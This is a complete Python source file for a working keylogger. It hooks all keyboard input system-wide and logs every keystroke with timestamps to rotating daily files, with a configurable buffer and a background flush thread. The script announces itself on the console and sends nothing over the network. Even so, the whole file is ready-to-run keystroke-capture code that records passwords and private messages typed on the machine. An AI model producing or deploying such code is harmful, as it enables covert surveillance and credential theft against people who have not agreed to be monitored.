import keyboard
import datetime
import os
import json
import threading
from pathlib import Path
from collections import deque

# Configuration
CONFIG_FILE = "keylogger_config.json"
DEFAULT_CONFIG = {
    "log_directory": "logs",
    "max_file_size_mb": 5,
    "batch_size": 50,
    "batch_timeout_seconds": 10,
    "excluded_keys": ["shift", "ctrl", "alt", "cmd", "windows"],
    "log_special_keys": True
}

class KeyLogger:
    def __init__(self, config_file=CONFIG_FILE):
        self.config = self.load_config(config_file)
        self.log_directory = self.config["log_directory"]
        self.max_file_size = self.config["max_file_size_mb"] * 1024 * 1024
        self.batch_size = self.config["batch_size"]
        self.batch_timeout = self.config["batch_timeout_seconds"]
        self.excluded_keys = set(self.config["excluded_keys"])
        self.log_special_keys = self.config["log_special_keys"]
        
        # Key buffer for batch writing
        self.key_buffer = deque()
        self.buffer_lock = threading.Lock()
        self.last_write_time = datetime.datetime.now()
        self.running = True
        
        # Initialize logging
        self.setup_logging()
        
    def load_config(self, config_file):
        """Load configuration from JSON file or create default."""
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
            else:
                self.save_config(config_file, DEFAULT_CONFIG)
                return DEFAULT_CONFIG
        except Exception as e:
            print(f"Error loading config: {e}. Using defaults.")
            return DEFAULT_CONFIG
    
    def save_config(self, config_file, config):
        """Save configuration to JSON file."""
        try:
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            print(f"Configuration saved to {config_file}")
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def setup_logging(self):
        """Initialize log directory and verify permissions."""
        try:
            Path(self.log_directory).mkdir(exist_ok=True)
            
            # Test write permission
            test_file = os.path.join(self.log_directory, ".permission_test")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            
            print(f"✓ Log directory ready: {self.log_directory}")
        except PermissionError:
            print(f"✗ Permission denied: Cannot write to {self.log_directory}")
            raise
        except Exception as e:
            print(f"✗ Error setting up logging: {e}")
            raise
    
    def get_log_file(self):
        """Get today's log file path."""
        today = datetime.datetime.now().strftime("%Y-%m-%d")
        return os.path.join(self.log_directory, f"keylog_{today}.txt")
    
    def check_file_rotation(self):
        """Rotate log file if it exceeds max size."""
        log_file = self.get_log_file()
        if os.path.exists(log_file) and os.path.getsize(log_file) > self.max_file_size:
            timestamp = datetime.datetime.now().strftime("%H-%M-%S")
            backup = os.path.join(self.log_directory, f"keylog_{timestamp}.txt")
            try:
                os.rename(log_file, backup)
                print(f"Log file rotated to {backup}")
            except Exception as e:
                print(f"Error rotating log file: {e}")
    
    def format_key(self, event):
        """Format key event with special handling."""
        key_name = event.name.lower()
        
        # Check if key should be excluded
        if key_name in self.excluded_keys:
            return None
        
        # Special key formatting
        special_keys = {
            'space': '[SPACE]',
            'enter': '[ENTER]',
            'backspace': '[BACKSPACE]',
            'tab': '[TAB]',
            'escape': '[ESC]',
            'delete': '[DELETE]',
            'insert': '[INSERT]',
            'home': '[HOME]',
            'end': '[END]',
            'page up': '[PGUP]',
            'page down': '[PGDN]',
        }
        
        if key_name in special_keys:
            if self.log_special_keys:
                return special_keys[key_name]
            else:
                return None
        
        return event.name
    
    def on_key_press(self, event):
        """Handle key press event."""
        formatted_key = self.format_key(event)
        
        if formatted_key is None:
            return
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log_entry = f"[{timestamp}] {formatted_key}"
        
        # Add to buffer
        with self.buffer_lock:
            self.key_buffer.append(log_entry)
            
            # Flush if buffer is full
            if len(self.key_buffer) >= self.batch_size:
                self.flush_buffer()
    
    def flush_buffer(self):
        """Write buffered keys to file."""
        if not self.key_buffer:
            return
        
        try:
            self.check_file_rotation()
            log_file = self.get_log_file()
            
            with open(log_file, 'a') as f:
                while self.key_buffer:
                    f.write(self.key_buffer.popleft() + '\n')
            
            self.last_write_time = datetime.datetime.now()
        except Exception as e:
            print(f"Error writing to log file: {e}")
    
    def periodic_flush(self):
        """Periodically flush buffer based on timeout."""
        while self.running:
            try:
                elapsed = (datetime.datetime.now() - self.last_write_time).total_seconds()
                
                if elapsed > self.batch_timeout and self.key_buffer:
                    with self.buffer_lock:
                        self.flush_buffer()
                
                threading.Event().wait(1)  # Check every second
            except Exception as e:
                print(f"Error in periodic flush: {e}")
    
    def start(self):
        """Start the keylogger."""
        try:
            print("=" * 50)
            print("Enhanced Keylogger Started")
            print("=" * 50)
            print(f"Logging directory: {os.path.abspath(self.log_directory)}")
            print(f"Log file: {self.get_log_file()}")
            print("Press Ctrl+C to stop logging...")
            print("=" * 50)
            
            # Start periodic flush thread
            flush_thread = threading.Thread(target=self.periodic_flush, daemon=True)
            flush_thread.start()
            
            # Start keyboard listener
            keyboard.on_press(self.on_key_press)
            keyboard.wait()
            
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            self.stop()
    
    def stop(self):
        """Stop the keylogger and flush remaining data."""
        try:
            self.running = False
            print("\n" + "=" * 50)
            print("Shutting down keylogger...")
            
            # Flush remaining buffer
            with self.buffer_lock:
                self.flush_buffer()
            
            print("✓ Logging ended successfully")
            print("=" * 50)
        except Exception as e:
            print(f"Error during shutdown: {e}")

if __name__ == "__main__":
    try:
        keylogger = KeyLogger()
        keylogger.start()
    except Exception as e:
        print(f"Fatal error: {e}")
